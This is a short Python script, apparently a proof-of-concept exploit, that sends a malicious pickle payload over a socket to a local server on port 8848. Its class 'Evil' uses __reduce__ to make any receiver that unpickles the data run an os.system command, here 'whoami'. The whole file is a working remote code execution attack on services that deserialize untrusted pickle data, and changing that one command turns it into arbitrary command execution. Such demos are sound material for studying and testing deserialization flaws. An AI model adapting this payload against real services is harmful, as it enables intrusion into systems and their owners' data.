import socket
import os
import pickle
from typing import Any

IP = "127.0.0.1"
PORT = 8848


class Evil:
    def __reduce__(self) -> str | tuple[Any, ...]:
        return (os.system, ("whoami",))


client = socket.socket()
client.connect((IP, PORT))

data = pickle.dumps(Evil())
data = len(data).to_bytes(4) + data
client.send(data)

client.close()
